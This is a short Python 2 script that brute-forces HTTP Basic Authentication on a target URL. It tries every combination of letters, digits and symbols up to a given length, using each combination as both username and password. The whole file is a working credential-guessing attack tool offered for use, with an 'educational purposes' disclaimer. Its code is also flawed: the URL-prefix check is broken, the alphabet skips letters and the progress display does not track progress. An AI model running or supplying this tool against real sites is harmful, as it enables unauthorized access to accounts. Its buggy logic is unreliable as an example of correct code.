#!/bin/python
#Need to install requests module, pip/easy_install install requests
#Bruteforcer coded by Yannvl
#Use only for educational purposes
import requests
import sys
import math
import time

from itertools import product
from sys import argv

script, l, site = argv

web = []
web.append(site)
#check if there is http:// in front of site, otherwise add it to the string site
if web[0:7] != "http://":
	web[0] = "http://" + str(site)
else:
	print "No good URL with http !!!"

print "Password Brute-Forcing target: " + web[0] + "\n\n"
#Check if url is up
url = requests.get(web[0])

#progress bar

def progress(width, percent):
	marks = math.floor(width * (percent / 100.0))
	spaces = math.floor(width - marks)

	loader = '[' + ('=' * int(marks)) + (' ' * int(spaces)) + ']'

	sys.stdout.write("%s %d%%\r" % (loader, percent))
	if percent >= 100:
		sys.stdout.write("\n")
	sys.stdout.flush()

if url.status_code == 401:
	#Characters to make wordlist
	chars1 = 'abcdefghijklmnprqstuvwyz' 
	chars2 = chars1.upper()
	nrs = '0123456789'
	special = '!@#$%^&*()_+=-][{}?/><,.~`|'
	chars = chars1 + chars2 + nrs + special

	def attempt(l):
		fail = 0
		for length in range(0, int(l)):
			to_attempt = product(chars, repeat = length)

			for attempt in to_attempt:
				p = []
				u = p

				p.append(''.join(attempt))
				
				for user in u:
					for password in p:
						#print "Trying %s : %s" %(user, password)
						progress(50, (len(p) +1))

						login = user, password
						req = requests.get(url=web[0], auth=(login))
						if req.status_code == 200:
							print "Success on: Username = %s and Password = %s <--!" % (user, password)
						else:
							fail = fail + 1
							time.sleep(0.1)
	attempt(l)
else:
	print "Website not online or not a valid HTTP basic AUTH!"
	sys.exit()
